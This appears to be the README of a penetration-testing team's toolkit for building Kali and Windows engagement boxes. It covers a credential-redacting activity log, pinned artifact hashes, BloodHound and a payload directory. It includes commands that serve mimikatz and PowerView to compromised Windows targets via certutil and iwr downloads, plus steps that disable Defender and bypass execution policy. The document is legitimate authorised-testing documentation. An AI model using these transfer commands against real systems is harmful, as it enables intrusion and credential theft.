# PSUT VAPT Team — Engagement Toolkit

Build scripts for a penetration-testing engagement platform: tooling, plus an
**evidence layer** that produces a timestamped, credential-redacted record of what
the team actually did. Targets a fresh **Kali Linux** box, with a small companion
script for a Windows box.

> **Scope note.** This repository contains build and tooling scripts only. It
> carries no information about any competition environment, client or engagement.
> Nothing engagement-specific is committed here, by policy.

---

## Quick start

Run these **in order**. They call `sudo` themselves where needed, and running the
whole thing under `sudo` is also safe — the scripts work out the operator's home
from their own path rather than from `$HOME`, so nothing lands in `/root`.

**No step asks a question.** Every `apt` call is fully non-interactive and the
preflight reports rather than blocks, so a build can be started and left alone.

```bash
git clone <this-repo>
cd <this-repo>

bash start.sh      # base packages, docker, desktop, command logging, terminal
# -> do the two manual steps it prints, then:
bash all.sh        # EVERYTHING ELSE (~35 min): web, cloud, OT, reporting,
                   # Burp + its logging extension, and AD/internal
```

**There is no separate `ad.sh` step any more** — the AD/internal tooling is part of
`all.sh`. `ad.sh` still exists as a thin wrapper (`all.sh --ad-only`) so the
printed on-site checklist and everyone's muscle memory keep working, but a box
built from scratch only needs the two commands above.

`all.sh` re-checks the manual steps from `start.sh`, shows exactly what is missing
and how to fix each one, then **continues**. That matters because anything you run
before command logging is live is absent from the activity log — so fix the items it
lists, but the build does not wait for you. `STRICT_PREFLIGHT=1` makes a failure
abort instead; `SKIP_PREFLIGHT=1` skips the checks.

`all.sh` also installs **Burp Suite Community** (PortSwigger's latest, ~650 MB) and
*then* wires in the logging extension — that order is required, because
`burp_logging.sh` patches a config file Burp only writes once it exists.

The jVision server can be brought up in a second terminal while `all.sh` runs —
`start.sh` installs Docker specifically so that is possible (`all.sh` holds the apt
lock for its whole package phase).

### Flags

```bash
bash all.sh              # everything. This is what almost everyone runs.
bash all.sh --mobile     # + mobile kit + nuclei-templates   (~2.3 GB extra)
bash all.sh --ad-only    # ONLY the AD/internal section (what ad.sh used to do)
bash all.sh --no-ad      # skip AD/internal (~650 MB: BloodHound CE, neo4j, payloads)
bash all.sh --help
```

The default installs everything, deliberately — nobody should have to remember a
flag on engagement morning. `--mobile` (formerly `--ismael`, still accepted) exists only because two items dominate the
build's weight while one operator needs them; `--ad-only` and `--no-ad` exist for
the two cases where that actually matters.

⚠️ If nobody runs `--mobile`, nobody has nuclei templates offline — `nuclei`
downloads them on first use, which fails without egress.

### Lost a box mid-engagement

```bash
bash smol-all.sh              # core + web + AD, ~3-6 min
bash smol-all.sh --web        # core + web only
bash smol-all.sh --ad         # core + AD only
bash smol-all.sh --no-burp    # skip the heaviest package
```

Installs only the critical path and **re-arms the evidence layer**, which a rebuilt
box otherwise has none of. It is self-contained on purpose — no sourcing of
`lib.sh` — so it still runs if the clone on a freshly rebuilt box is partial.

### Windows box

```powershell
powershell -ep bypass
.\windows.ps1                  # everyone      - Burp Community, Snaffler, PuTTY
.\windows-mobile.ps1           # MOBILE OWNER  - ~5.9 GB down, 10 GB+ on disk
```

**Run `windows.ps1` first.** It is what disables Defender and the firewall and
records the pre-change state; `windows-mobile.ps1` only *reports* Defender's state
and will warn you if real-time monitoring is still on.

`windows-mobile.ps1` is Android Studio, the Android SDK, **two emulators** (API
37.1, and API 33 **without** the Play Store so it can be rooted for frida), `adb`,
`jadx` and `frida-tools`. Same deal as `all.sh --mobile`: nobody else should pay
for it. It was a `-Mobile` switch until 2026-10-11; it shares nothing with the base
script at runtime, so it is its own file.

⚠️ **Needs internet. Run it during prep, not on engagement morning.**

---

## What's in here

| File | Purpose |
|---|---|
| `start.sh` | Bootstrap: base packages, Docker, XFCE + xRDP, and the evidence layer |
| `all.sh` | The whole build — web, cloud, OT, reporting, Burp, **and AD/internal** — then one verification pass |
| `ad.sh` | **Compatibility wrapper** → `all.sh --ad-only`. The AD build lives in `all.sh` now |
| `smol-all.sh` | Emergency rebuild — critical path only |
| `lib.sh` | Shared helpers, the `$USER_HOME` resolver, the Burp installer, the **verification helpers** and the **artifact pin manifest** |
| `pins.sh` | Record / verify the pinned sha256 values |
| `windows.ps1` | Windows box: Burp Community, Snaffler, PuTTY scrollback |
| `windows-mobile.ps1` | Windows box, **mobile owner only**: Android Studio, SDK, two emulators, adb, jadx, frida |
| `command_logging.sh` | Timestamped, credential-redacted shell log (zsh + bash) |
| `burp_logging.sh`, `burp_logger.py` | Burp extension logging HTTP traffic to a readable file (run by `all.sh`, after Burp) |
| `terminal_uniform.sh` | Identical terminal appearance across the team, for screenshots |
| `redaction_test.sh` | Proves both redactors strip secrets and keep identities |
| `jvis_logsync.sh`, `jvis_logsync.py` | Push both readable logs to the jVision server |
| `TOOLS.md` | Full tool inventory with measured download/disk weight |
| `REHEARSAL.md` | **How to rehearse a build so it proves something.** Read before building. |

---

## The evidence layer

This is the part that distinguishes the repo from a list of `apt install` lines. It
answers one question: *prove what this team did at time T.*

| Artifact | Written by | Path |
|---|---|---|
| Readable command log | `command_logging.sh` | `~/.zsh_history_readable` |
| Burp HTTP log | `burp_logger.py` | `~/.burp_history_readable` |
| Uniform terminal | `terminal_uniform.sh` | qterminal + xfce4-terminal configs |

Each command log line is `<time> (exit <code>) <command>`.

**Redaction policy: every secret is redacted, every username is kept in full.**
Passwords, NTLM/LM hashes, Kerberos keys and tickets, and web secrets
(`Authorization`/`Cookie`/API-key headers, `--token`, basic auth, and `key=value`
secrets in query strings, bodies and JSON) become `[REDACTED]`. Field names are
matched **with their decoration**, so `passwordRepeat`, `newPassword` and
`password_confirmation` are caught too, as are one-time codes (`otp`, `mfa`,
`recovery_code`), key material (`x-api-key`, `ssh_key`, `private_key`), DB
connection strings and request signatures. The client's own vocabulary is
deliberately left alone — `ticketId`, `ticket_type`, `passType`, `passholder`
and `passenger` are ticketing evidence, not secrets. Usernames, domains, hostnames and IPs are
kept deliberately — the log exists so someone can answer "which account touched
this host at time T", and a masked username defeats the only question it is there
to answer. **The command still runs unmodified; only the logged text is scrubbed.**

The terminal uniform pins all 16 ANSI colours, not just foreground/background, so
coloured tool output renders identically on both emulators. The palette is tuned
for colour-vision deficiency: every colour clears 5.6:1 contrast on black under
normal, protan, deutan and tritan vision, with the four status colours held ≥ dE00
25 apart. Screenshots end up in a report, so this is legibility for the reader too.

Verify it works, don't assume:

```bash
bash redaction_test.sh          # both redactors, one shared battery of real cases
bash redaction_test.sh -v       # show every case and what it redacts to
```

That test exists because the two redactors enforce the same policy in different
languages against different input, and **they had already drifted** — one of them
was logging `pass=` in clear while the other redacted it, and seven installed
tools were leaking `-p <password>` because the shell side gates that flag behind a
tool allowlist they were missing from. The 2026-10-09 pass found the two halves
failing on the *same* input in *different* ways: the Burp side was anchored with
`\b`, so every prefixed field name (`newPassword`, `new_password`) went in clear,
while both sides required `=` immediately after the root, so every suffixed one
(`passwordRepeat`, `password2`) did too — 81 of 110 realistic field names leaked.
Run it after touching either redactor.

Then confirm it live:

```bash
source ~/.zshrc                                       # or open a fresh shell
nxc smb 10.0.0.1 -u administrator -p 'Summer2026!'
cat ~/.zsh_history_readable
#  -> -u administrator       kept in full
#  -> -p [REDACTED]          secret gone
```

---

## Reproducible builds: the pin manifest

Every third-party artifact the scripts download is declared in one place in
`lib.sh` with the version intended and the sha256 expected.

The problem it solves: when half of these track `latest`/`master`/`@latest`, two
operators building on the same morning get different binaries, "it worked on my
box" stops meaning anything, and an upstream release can land mid-engagement
without anyone choosing it. A repository freeze gives you *script* stability; this
manifest is what gives you *artifact* stability.

```bash
bash pins.sh --show                      # what is pinned, what tracks a moving target
bash pins.sh --record                    # download everything, print the real hashes
bash pins.sh --write                     # same, but edit lib.sh in place (backup kept)
bash pins.sh --verify                    # drift check — run the week before the event
bash pins.sh --audit                     # is THIS box built from the manifest? (no network)
bash pins.sh --write mimikatz pstools    # narrow the run to named artifacts
```

`--verify` and `--audit` answer different questions. `--verify` re-downloads and
asks *"did upstream move?"*. `--audit` re-hashes the files `~/pins.lock` says
landed on this box and asks *"is this box actually what we pinned?"* — run that on
arrival and after any `smol-all.sh` rebuild.

Hashes ship as `TBD`, meaning **unverified**. That is deliberate: a hash nobody
computed is worse than no hash, because it looks like verification while verifying
nothing. Fill them in during a rehearsal on a trusted network and commit the
result. Until then, every unpinned artifact is reported at the end of a run instead
of being silently accepted.

Each box also writes `~/pins.lock` recording what it *actually* downloaded.
**Diff that file between two operators' boxes — any difference is a build that will
not reproduce.**

A handful of artifacts have no pinnable upstream (archived repos with no tags,
vendor "current" download URLs). Those stay on `master`/`current` and are reported
as unpinned. That is upstream's constraint, not an oversight.

---

## BloodHound runs on Kali only

| Viewer | Where | Fed by |
|---|---|---|
| **BloodHound CE 9.4.0** | Kali — `sudo bloodhound-start` | `bloodhound-ce-python`, `~/dropzone/windows/ce/SharpHound.exe` (2.x), `azurehound` |

**The Windows legacy stack was removed on 2026-10-11.** BloodHound 4.3.1 + Neo4j
4.4.19 were on the Windows box as a "backup viewer" for Kali's collections, and it
could not have served that purpose:

- **Legacy cannot read a CE zip**, CE cannot read a legacy one, and **no converter
  exists**. The Windows viewer would have needed its own separate legacy collection
  taken on the day — a second pass against the client that nobody owned.
- **CE cannot be stood up on Windows instead.** It is a Docker Compose stack
  needing *Linux* containers, which Windows Server cannot provide; `bloodhound-cli`
  is only a wrapper around that same compose stack.

**The backup is the collection zips, not a second viewer.** Keep them on the
officials-provided drive — KB §10.0 makes that the only permitted storage for
assessment data anyway — and re-ingest on any of the other five Kali boxes if one
dies. Same format, no conversion, nothing to install.

⚠️ **Loose end:** the *legacy collectors* are still built on Kali
(`bloodhound-python`, `~/dropzone/windows/legacy/SharpHound.exe` 1.x) and now have
no viewer anywhere. Either drop them or re-add a legacy viewer; right now they
produce zips nothing in the build can open.

---

## The Windows payload set

`all.sh` builds `~/dropzone/windows/` on **Kali**. These are payloads **uploaded to
compromised Windows targets** — they are not installed on our own Windows box. The
directory is a flat HTTP root on purpose, so the transfer line stays short:

```bash
cd ~/dropzone/windows && python3 -m http.server 9999
#   target>  certutil -urlcache -split -f http://<kali>:9999/mimikatz.exe m.exe
#   target>  iwr -UseBasicParsing http://<kali>:9999/PowerView.ps1 -OutFile pv.ps1

# or over SMB:
impacket-smbserver -smb2support share ~/dropzone/windows
```

Every item is version-pinned and hash-verifiable through the manifest, and the
verification pass checks each one is a real PE or script rather than a
captive-portal login page saved with a 200 status.

---

## Where things land

| Path | What |
|---|---|
| `~/dropzone/` | Clones and downloaded payloads |
| `~/dropzone/windows/` | Windows payload set (flat HTTP root) |
| `~/dropzone/windows/legacy/` · `~/dropzone/windows/ce/` | The two SharpHound generations, kept apart |
| `~/dropzone/privesc/` | linpeas / winpeas / PowerUp / PrivescCheck |
| `/usr/local/bin/` | `chisel`, `upshell`, `kerbrute`, `windapsearch`, `azurehound`, `ligolo-proxy` |
| `~/go/bin/` | `httpx`, `httprobe`, `subfinder`, `waybackurls` |
| `/usr/share/wordlists/` · `/usr/share/seclists/` | Wordlists |
| `~/.BurpSuite/` | Jython jar + the logging extension |
| `/opt/burpsuite/` | Burp jar + `VERSION`; launcher at `/usr/local/bin/burpsuite` |
| `~/pins.lock` | What this box actually downloaded |

### Logs

| File | From |
|---|---|
| `~/start_install.log` | `start.sh` |
| `~/all_install.log` | `all.sh` |
| `~/ad_install.log` | `ad.sh` |
| `~/smol_install.log` | `smol-all.sh` |
| `~/windows_install.log` | `windows.ps1` |

---

## After installing

**Log out and back in.** Several things only take effect on a fresh login:

- command logging (new shells load the `~/.zshrc` / `~/.bashrc` hooks)
- the uniform terminal look (applies to new windows)
- docker group membership (run docker without `sudo`)
- `PATH` for `~/go/bin` and `~/.local/bin`

Then read the **verification summary** each script prints, line by line. Every FAIL
and WARN is a finding. Verification *runs* each tool rather than just locating it,
so a FAIL means the tool genuinely does not work — don't wave any of them through.

---

## Before relying on any of this

Read **`REHEARSAL.md`** and do a real rehearsal. The short version:

1. **Fresh VM snapshot every time.** Half of what these scripts do is edit dotfiles
   and system config, and those edits are guarded — a second run down a guarded
   path proves nothing about the first.
2. **The user must not be named `kali`.** A hardcoded `/home/kali` path once
   survived every rehearsal because the practice VM's user happened to be `kali`.
   Half the installs landed in the wrong directory and verification then reported
   NOT FOUND for tools that had installed fine.
3. **Rehearse on the network you will have**, not your home connection.
4. **Two people, two boxes, same morning.** Divergence between them is the finding.

Then record the wall times, the PASS/WARN/FAIL counts, and the pin summary.

---

## Conventions for contributors

- **Tool changes go in `TOOLS.md` in the same commit.** That file is generated by
  hand from the install lines; if it drifts it stops being usable.
- **Add shared helpers to `lib.sh`, not to each script.** The helpers were once
  copy-pasted into every installer, and a fix applied to one copy never reached the
  others — with nothing anywhere reporting the divergence. `smol-all.sh` is the one
  deliberate exception.
- **Every new download goes in the pin manifest.** Not inline `curl`.
- **Comment the failure a line prevents, not what it does.** `apt install` is self
  explanatory; `sudo env DEBIAN_FRONTEND=noninteractive` is not, and the reason it
  is there is the thing worth writing down.
- **New tools need a verification check**, and the check must run the tool.
